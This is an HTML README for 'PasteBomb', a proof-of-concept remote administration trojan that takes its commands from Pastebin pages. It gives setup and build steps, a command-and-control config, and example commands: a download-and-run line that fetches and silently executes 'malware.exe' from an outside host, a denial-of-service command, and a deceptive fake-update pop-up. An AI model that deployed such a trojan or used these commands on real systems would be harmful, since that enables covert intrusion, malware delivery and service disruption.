<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PasteBomb - Remote Administration Trojan (RAT) Proof-of-Concept</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 20px;
        }
        h1, h2, h3, h4 {
            color: #333;
        }
        h2 {
            margin-top: 40px;
        }
        ul {
            list-style-type: disc;
            margin-left: 20px;
        }
        a {
            color: #0066cc;
        }
        .badge {
            margin: 5px;
        }
        .badge img {
            height: 20px;
        }
        .banner {
            text-align: center;
            margin-bottom: 30px;
        }
        .banner img {
            width: 50%;
        }
        .description, .features, .installation, .usage, .security, .acknowledgements, .contact, .disclaimer {
            margin: 20px 0;
        }
        .disclaimer {
            background-color: #f8d7da;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>

<div class="banner">
    <h1>PasteBomb</h1>
    <p><strong>Remote Administration Trojan (RAT) Proof-of-Concept</strong></p>
    <p>
        <a href="#description" class="badge">Description</a> •
        <a href="#features" class="badge">Features</a> •
        <a href="#installation" class="badge">Installation</a> •
        <a href="#usage" class="badge">Usage</a> •
        <a href="#security" class="badge">Security Implications</a> •
        <a href="#acknowledgements" class="badge">Acknowledgements</a> •
        <a href="#contact" class="badge">Contact</a>
    </p>
    <img src="./pastebomb.png" alt="PasteBomb Logo">
    <hr>
</div>

<div id="description" class="description">
    <h2>Description</h2>
    <p>
        <strong>PasteBomb</strong> is a proof-of-concept Remote Administration Trojan (RAT) that demonstrates how commands can be executed remotely using Pastebin instead of a traditional Command-and-Control (C2) server. This project is designed solely for educational purposes to highlight security risks and the importance of robust system hardening.
    </p>
    <p>
        **PasteBomb** allows attackers to remotely execute commands, download files, display pop-up messages, and simulate Denial-of-Service (DoS) attacks on targeted systems. By using Pastebin as the medium for command execution, it illustrates a potential vulnerability of systems that fail to secure remote command input.
    </p>
</div>

<div id="features" class="features">
    <h2>Features</h2>

    <h4>Remote Command Execution</h4>
    <p>Execute terminal commands dynamically fetched from Pastebin. For example:</p>
    <pre><code>cmd dir</code></pre>
    <pre><code>cmd ls /home/user/</code></pre>
    <p>These commands will list files in the specified directory.</p>

    <h4>File Operations</h4>
    <p>Download and execute files on the target machine. You can optionally hide files during download:</p>
    <pre><code>download http://example.com/file.exe C:\path\to\file.exe RUN,HIDE</code></pre>
    <pre><code>download http://example.com/script.sh /usr/local/bin/script.sh RUN</code></pre>
    <p>This will download and optionally execute files on the target system.</p>

    <h4>Pop-Up Messaging</h4>
    <p>Display customizable pop-up messages to the user on the target system:</p>
    <pre><code>popmsg "This is a demonstration message!"</code></pre>
    <p>This sends a pop-up message to the target’s browser.</p>

    <h4>Denial-of-Service Simulation</h4>
    <p>Perform a simulated DoS attack on a target IP and port:</p>
    <pre><code>dos 192.168.1.100 80 120</code></pre>
    <p>This simulates a DoS attack on the specified IP and port for 120 seconds.</p>
</div>

<div id="installation" class="installation">
    <h2>Installation</h2>

    <h3>Prerequisites</h3>
    <p>Before running **PasteBomb**, make sure you have Go (Golang) installed on your system.</p>

    <h3>Clone the Repository</h3>
    <pre><code>git clone https://github.com/yourusername/pastebomb.git</code></pre>
    <pre><code>cd pastebomb</code></pre>

    <h3>Configuration</h3>
    <p>Create a <code>config.json</code> file in the project root with the following structure:</p>
    <pre><code>{
    "url": "https://pastebin.com/raw/<paste_id>",
    "backups": [
        "https://pastebin.com/raw/<backup_id1>",
        "https://pastebin.com/raw/<backup_id2>"
    ]
}</code></pre>
    <p>This configures the URLs where PasteBomb will fetch the commands from. Replace <code>&lt;paste_id&gt;</code>, <code>&lt;backup_id1&gt;</code>, and <code>&lt;backup_id2&gt;</code> with actual Pastebin IDs.</p>

    <h3>Build and Run</h3>
    <p>To compile the Go program:</p>
    <pre><code>go build -o pastebomb main.go</code></pre>
    <p>To run the executable:</p>
    <pre><code>./pastebomb</code></pre>
</div>

<div id="usage" class="usage">
    <h2>Usage</h2>
    <p>Once **PasteBomb** is running, it will start fetching commands from the provided Pastebin URLs and execute them on the target system sequentially. Below are some example commands you can upload to Pastebin for execution:</p>

    <h3>1. Remote Command Execution</h3>
    <pre><code>cmd dir</code></pre>
    <p>This command will list the files in the current directory.</p>

    <h3>2. File Download and Execution</h3>
    <pre><code>download http://example.com/malware.exe C:\Users\Public\malware.exe RUN,HIDE</code></pre>
    <p>This will download and execute a malicious file on the target machine.</p>

    <h3>3. Pop-Up Messages</h3>
    <pre><code>popmsg "Your system is being updated!"</code></pre>
    <p>This will display a pop-up message to the target user.</p>

    <h3>4. Denial-of-Service Simulation</h3>
    <pre><code>dos 192.168.1.100 80 120</code></pre>
    <p>This simulates a DoS attack on the target system for 120 seconds.</p>
</div>

<div id="security" class="security">
    <h2>Security Implications</h2>
    <p><strong>PasteBomb</strong> is an educational tool designed to demonstrate potential security risks in system configurations. It highlights the following vulnerabilities:</p>
    <ul>
        <li>The dangers of executing remote commands without proper security measures.</li>
        <li>The risks of downloading and executing unverified files from untrusted sources.</li>
        <li>The need for monitoring and blocking unusual network traffic.</li>
    </ul>
    <p><strong>Note:</strong> The tool is intended for use in controlled, ethical environments for educational purposes only. Misuse may result in legal consequences. Always ensure that you have permission before running **PasteBomb** or similar tools on any system.</p>
</div>

<div id="acknowledgements" class="acknowledgements">
    <h2>Acknowledgements</h2>
    <p>**PasteBomb** is a demonstration tool for showcasing how command execution can be remotely controlled via a platform like Pastebin. It is not intended for malicious use. Contributions to improve or enhance this project are welcome.</p>
</div>

<div id="contact" class="contact">
    <h2>Contact</h2>
    <p>For any questions or feedback, feel free to reach out via:</p>
    <ul>
        <li><a href="https://in.linkedin.com/in/umair-nehri-49699317a" target="_blank">LinkedIn</a></li>
        <li><a href="mailto:umairnehri9747@gmail.com" target="_blank">Email</a></li>
    </ul>
</div>

<div class="disclaimer">
    <h2>Legal Disclaimer</h2>
    <p>**PasteBomb** is for educational and research purposes only. Usage of this tool to attack or scan systems without permission is illegal. Always obtain explicit consent before testing any system. The developers assume no responsibility for any misuse or damage caused by this tool.</p>
</div>

</body>
</html>
